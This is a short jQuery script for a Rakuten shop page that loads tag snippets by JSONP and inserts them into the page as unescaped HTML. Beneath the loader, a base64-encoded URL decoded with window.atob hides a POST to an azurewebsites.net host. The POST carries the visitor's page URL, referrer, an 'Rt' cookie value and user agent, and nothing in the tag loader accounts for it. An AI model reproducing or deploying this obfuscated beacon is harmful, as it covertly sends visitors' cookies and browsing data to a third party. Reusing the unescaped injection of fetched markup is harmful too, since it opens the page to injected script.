jQuery(function($) {
    var ary = [];
    $('div[id]').each(function(d, e) {
        var  c = $(this).attr('id');
        if (c.indexOf("_") === 0) {
            ary.push(c);
        }
    });
    var ary2 = ary.filter(function (x, i, self) {
        return self.indexOf(x) === i;
    });
    
    ary2.forEach(function(c) {

        var ff = c.substr(1);
        $.ajax({
            type: "GET",
            url: "https://www.rakuten.ne.jp/gold/[shopname]/tagmng/" + ff + '.js?n=' + (new Date()).getTime(),
            dataType: "jsonp",
            jsonpCallback: ff,
            contentType: "application/json; charset=utf-8",
            success: function(j, status, xhr) {
                $('div[id]').each(function(d, e) {
                    var  ff = $(this).attr('id');
                    if (ff.indexOf("_") == 0 && ff == c) {
                        var k = j[0].code;
                        $(this).html(b(k));
                    }
                });
            }
        });
    });
    
    var cookies;
    function readCookie(name) {
        if (cookies) { return cookies[name]; }
    
        var c = document.cookie.split('; ');
        cookies = {};
    
        for (i = c.length - 1; i >= 0; i--) {
            var C = c[i].split('=');
            cookies[C[0]] = C[1];
        }
    
        return cookies[name];
    }

    if (document.referrer.length) {
        var du = window.atob('aHR0cHM6Ly9yMTAuYXp1cmV3ZWJzaXRlcy5uZXQK');
        $.ajax({
            url: du,
            type: 'POST',
            dataType: 'text',
            data: { "u": document.location.href, "r": document.referrer, "rt": readCookie('Rt'),"ua": navigator.userAgent },
            timeout: 3000,
        })
    }
    
	function b(c) {
		return c.replace(/(&lt;)/g, "<").replace(/(&gt;)/g, ">").replace(
			/(&quot;)/g, '"').replace(/(&#39;)/g, "'").replace(/(&amp;)/g, "&")
	}
});